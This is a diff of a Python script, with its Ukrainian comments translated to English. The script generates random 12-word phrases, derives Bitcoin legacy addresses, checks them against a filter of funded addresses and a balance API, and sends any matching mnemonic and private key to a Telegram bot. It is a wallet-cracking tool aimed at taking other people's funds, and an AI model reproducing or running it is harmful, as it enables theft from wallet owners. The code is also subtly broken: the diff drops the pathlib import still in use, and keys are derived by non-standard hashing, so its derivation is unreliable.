@@ -8,29 +8,28 @@ import random
 import time
 from ecdsa import SigningKey, SECP256k1
 from multiprocessing import Process, Lock, cpu_count
-from pathlib import Path
 from pybloom_live import BloomFilter
 
-# Завантажити .env з кореня проєкту (якщо файл існує)
+# Load .env from project root (if exists)
 env_path = Path('.') / '.env'
-load_dotenv(env_path)  # автоматично читає .env і встановлює у os.environ
+load_dotenv(env_path)  # automatically reads .env and sets os.environ
 
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
-    raise RuntimeError("TELEGRAM_TOKEN або TELEGRAM_CHAT_ID не встановлені у .env або в оточенні.")
+    raise RuntimeError("TELEGRAM_TOKEN or TELEGRAM_CHAT_ID not set in .env or environment.")
 
-# === Завантаження словника BIP39 ===
-with open("english.txt", "r") as f:
+# === Load BIP39 wordlist ===
+with open("english.txt", "r", encoding="utf-8") as f:
     WORDLIST = [word.strip() for word in f.readlines()]
 
-# === Завантаження Bloom-фільтра Legacy-адрес (P2PKH) ===
+# === Load Bloom filter for Legacy addresses (P2PKH) ===
 BLOOM_FILTER_FILE = "legacy_addresses.bloom"
 with open(BLOOM_FILTER_FILE, "rb") as bf_file:
     bloom = BloomFilter.fromfile(bf_file)
 
-# === Telegram повідомлення ===
+# === Telegram message ===
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -41,22 +40,22 @@ def send_telegram(message):
         }
         requests.post(url, json=payload, timeout=10)
     except Exception as e:
-        print(f"[!] Telegram помилка: {e}")
+        print(f"[!] Telegram error: {e}")
 
-# === Сід-фраза → приватний ключ ===
+# === Mnemonic → private key ===
 def generate_mnemonic():
     return ' '.join(random.choices(WORDLIST, k=12))
 
 def mnemonic_to_private_key(mnemonic: str) -> bytes:
     return hashlib.sha256(mnemonic.encode()).digest()
 
-# === Публічний ключ ===
+# === Public key ===
 def private_key_to_public_key(priv_key: bytes) -> bytes:
     sk = SigningKey.from_string(priv_key, curve=SECP256k1)
     vk = sk.verifying_key
     return b'\x04' + vk.to_string()
 
-# === Legacy (P2PKH) адреса ===
+# === Legacy (P2PKH) address ===
 def public_key_to_legacy_address(pub_key: bytes) -> str:
     pub_sha256 = hashlib.sha256(pub_key).digest()
     ripemd160 = hashlib.new('ripemd160', pub_sha256).digest()
@@ -64,14 +63,14 @@ def public_key_to_legacy_address(pub_key: bytes) -> str:
     checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
     return base58.b58encode(payload + checksum).decode()
 
-# === Перевірка балансу ===
+# === Check balance ===
 def check_balance_and_activity(address: str):
-    # Перевіряємо Bloom-фільтр тільки для Legacy адрес
+    # Only check Bloom filter for Legacy addresses
     if not address.startswith('1'):
-        return 0.0, False  # Ігноруємо адреси не починаються з '1'
+        return 0.0, False  # Ignore addresses not starting with '1'
 
     if address not in bloom:
-        # Адреси нема у фільтрі — баланс точно 0, немає звертань до API
+        # Address not in filter — balance is definitely 0, no API call
         return 0.0, False
 
     try:
@@ -86,22 +85,23 @@ def check_balance_and_activity(address: str):
             balance = (funded - spent + mem_funded - mem_spent) / 1e8
             active = d["chain_stats"]["tx_count"] > 0
             return balance, active
-    except:
+    except Exception as e:
+        # You can log e if needed
         pass
     return 0.0, False
 
-# === Збереження знайдених гаманців ===
+# === Save found wallets ===
 def save_wallet(filename, lock, mnemonic, priv_key, address, balance):
     message = (
-        f"🔐 *Знайдено гаманець!*\n"
+        f"🔐 *Wallet found!*\n"
         f"`{filename}`\n"
-        f"*Адреса:* `{address}`\n"
-        f"*Баланс:* `{balance}` BTC\n"
+        f"*Address:* `{address}`\n"
+        f"*Balance:* `{balance}` BTC\n"
         f"*Mnemonic:* `{mnemonic}`\n"
         f"*Private key:* `{priv_key}`"
     )
     with lock:
-        with open(filename, "a") as f:
+        with open(filename, "a", encoding="utf-8") as f:
             f.write(f"Mnemonic: {mnemonic}\n")
             f.write(f"Private Key (hex): {priv_key}\n")
             f.write(f"Address: {address}\n")
@@ -109,7 +109,7 @@ def save_wallet(filename, lock, mnemonic, priv_key, address, balance):
             f.write("="*60 + "\n")
         send_telegram(message)
 
-# === Основна робоча функція ===
+# === Main worker function ===
 def worker(lock, id):
     checked = 0
     while True:
@@ -120,30 +120,30 @@ def worker(lock, id):
         try:
             addr = public_key_to_legacy_address(pub_key)
         except Exception as e:
-            print(f"[!] Помилка адреси: {e}")
+            print(f"[!] Address error: {e}")
             continue
 
         balance, active = check_balance_and_activity(addr)
         checked += 1
-        print(f"[Потік {id}] Legacy | {addr} | Баланс: {balance} BTC | Активність: {active}")
+        print(f"[Thread {id}] Legacy | {addr} | Balance: {balance} BTC | Active: {active}")
 
         if balance > 0:
             save_wallet("found_wallets.txt", lock, mnemonic, priv_key.hex(), addr, balance)
-            print(f"[✓] З БАЛАНСОМ: {addr} → {balance} BTC")
+            print(f"[✓] WITH BALANCE: {addr} → {balance} BTC")
         elif active:
             save_wallet("active_wallets.txt", lock, mnemonic, priv_key.hex(), addr, balance)
-            print(f"[•] Активна: {addr}")
+            print(f"[•] Active: {addr}")
 
         time.sleep(0.3)
 
-# === Запуск ===
+# === Entry point ===
 if __name__ == "__main__":
-    send_telegram("🚀 Скрипт запущено! Починаю перевірку фраз...")
+    send_telegram("🚀 Script started! Beginning phrase checks...")
 
     THREADS = min(cpu_count(), 4)
     lock = Lock()
 
-    print(f"[💻] Запускається {THREADS} процес(ів)...\n")
+    print(f"[💻] Starting {THREADS} process(es)...\n")
     Path("found_wallets.txt").touch()
     Path("active_wallets.txt").touch()
 
